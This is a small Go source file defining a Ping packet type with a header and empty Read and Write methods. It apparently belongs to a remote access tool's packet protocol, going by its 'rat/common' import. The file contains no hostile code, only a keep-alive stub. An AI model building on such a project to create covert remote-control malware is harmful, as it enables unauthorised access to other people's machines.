package main

import "rat/common"

type Ping struct {
	IncomingPacket
	OutgoingPacket
}

func (packet Ping) GetHeader() common.PacketHeader {
	return common.PingHeader
}

func (packet Ping) Write(c *Client) error {
	return nil
}

func (packet Ping) Read(c *Client) error {
	return nil
}
